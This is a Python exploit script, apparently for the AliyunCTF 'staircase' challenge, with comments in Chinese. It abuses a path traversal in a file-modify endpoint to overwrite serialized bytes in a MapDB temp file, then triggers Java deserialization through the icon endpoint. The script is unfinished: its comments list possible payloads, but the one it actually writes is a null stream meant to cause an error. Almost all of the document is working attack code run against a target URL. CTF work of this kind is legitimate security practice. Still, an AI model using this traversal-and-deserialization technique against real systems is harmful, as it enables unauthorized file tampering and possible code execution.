#!/usr/bin/env python3
"""
CTF Challenge: staircase - AliyunCTF
Final Exploit - MapDB Java Deserialization via Path Traversal

漏洞利用关键：
1. 路径穿越修改 /tmp/mapdb*temp 文件
2. 精确修改序列化数据的特定位置
3. 触发 Java 反序列化执行代码

MapDB 文件结构 (偏移 0x100250):
- AC ED 00 05: 序列化魔术字节
- 75 72 00 02 5B 42: TC_ARRAY + TC_CLASSDESC + 类名 "[B" 
- AC F3 17 F8 06 08 54 E0 02 00 00: serialVersionUID + flags
- 78 70: TC_ENDBLOCKDATA + TC_NULL
- 00 00 00 86: 数组长度 (134)
- [134 bytes PNG data]

写入限制：每次写入格式为 <start>DATA<end>
- <start> = 3C 73 74 61 72 74 3E (7 bytes)
- DATA = max 8 bytes (我们控制的)
- <end> = 3C 65 6E 64 3E (5 bytes)
- 总共 20 bytes

利用方案：
由于 DATA 在 offset+7 位置开始，我们可以精确控制要覆盖的 8 字节
"""

import requests
import base64
import sys
import time

class StaircaseExploit:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
        
    def upload(self, content, filename="test.bin", icon=None):
        files = {'file': (filename, content, 'application/octet-stream')}
        if icon:
            files['icon'] = ('icon.png', icon, 'image/png')
        return self.session.post(f"{self.url}/files/upload", files=files, timeout=10)
    
    def modify(self, path, data, offset):
        """修改文件，DATA 落在 offset+7 位置"""
        if len(data) > 8:
            data = data[:8]
        payload = {
            "fileName": path,
            "data": base64.b64encode(data).decode(),
            "offset": offset
        }
        return self.session.put(f"{self.url}/files/modify", json=payload, timeout=10)
    
    def get_icon(self):
        return self.session.get(f"{self.url}/files/icon", timeout=30)

    def write_at(self, mapdb_path, data_8bytes, target_offset):
        """在目标偏移位置写入 8 字节数据"""
        # DATA 在 offset+7 位置，所以 write_offset = target_offset - 7
        write_offset = target_offset - 7
        print(f"[*] Writing {data_8bytes.hex()} at target 0x{target_offset:x} (write_offset={write_offset})")
        return self.modify(mapdb_path, data_8bytes, write_offset)

    def exploit(self, mapdb_path):
        """
        主要利用逻辑
        
        目标：通过修改序列化数据触发代码执行
        
        策略：
        1. 修改类描述符，将 [B (byte[]) 改为恶意类
        2. 或者利用 SignedObject 绕过
        3. 或者构造特殊的序列化流
        """
        print("=" * 60)
        print(" Staircase Exploit")
        print("=" * 60)
        print(f"[*] Target: {self.url}")
        print(f"[*] MapDB: {mapdb_path}")
        print()
        
        # Step 1: 上传初始文件
        print("[1] Uploading...")
        self.upload(b"X" * 512)
        
        # Step 2: 验证路径穿越
        print("[2] Verifying path traversal...")
        # 在安全位置测试写入
        resp = self.modify(mapdb_path, b"X" * 8, 0x200000)
        if not resp or resp.status_code != 200:
            print("[-] Path traversal failed")
            return False
        print("[+] Path traversal works!")
        
        # Step 3: 精确修改序列化数据
        print("[3] Modifying serialization data...")
        
        # 原始数据在 0x100250:
        # AC ED 00 05 75 72 00 02 5B 42 ...
        # 
        # 我们可以覆盖 0x100250-0x100257 这 8 字节
        # 替换为: AC ED 00 05 XX XX XX XX
        # 其中 XX 是我们构造的恶意类描述
        
        # 方案 A: 构造一个指向 HashMap 的引用
        # AC ED 00 05 73 72 00 11 = TC_OBJECT + TC_CLASSDESC + len(17)
        # 后面需要 "java.util.HashMap" 但我们只有 4 字节空间
        
        # 方案 B: 使用 TC_NULL (70) 使反序列化返回 null
        # 这会导致 ClassCastException 但不会执行代码
        
        # 方案 C: 使用 TC_EXCEPTION (7B) 构造异常
        # AC ED 00 05 7B ... = 异常对象
        
        # 方案 D: 利用现有的类描述符引用
        # 如果后续数据中有可利用的类引用...
        
        # 让我们尝试方案 C - 构造异常对象
        # 但这需要完整的异常类描述
        
        # 最终方案: 尝试用 URLDNS 探测
        # 这需要手工构造完整的序列化流
        
        # 暂时使用简单测试 - 修改为 TC_NULL
        print("[*] Attempting payload injection...")
        
        # 构造一个会触发异常的序列化流
        # AC ED 00 05 70 = null
        payload = b'\xac\xed\x00\x05\x70\x00\x00\x00'
        
        resp = self.write_at(mapdb_path, payload, 0x100250)
        if resp and resp.status_code == 200:
            print("[+] Payload written")
        else:
            print(f"[-] Write failed: {resp.text if resp else 'None'}")
            return False
        
        # Step 4: 触发反序列化
        print("[4] Triggering deserialization...")
        resp = self.get_icon()
        if resp:
            print(f"[*] Response: {resp.status_code}")
            if resp.status_code != 200:
                print("[!] Non-200 response - check server logs!")
        
        return True


def main():
    if len(sys.argv) < 3:
        print("""
Usage: python exp_final.py <url> <mapdb_path>

Example:
    python exp_final.py http://localhost:8080 ../../../tmp/mapdb123temp

To get MapDB path:
    docker exec <container> ls /tmp/mapdb*
        """)
        sys.exit(1)
    
    url = sys.argv[1]
    mapdb_path = sys.argv[2]
    
    exp = StaircaseExploit(url)
    exp.exploit(mapdb_path)


if __name__ == "__main__":
    main()
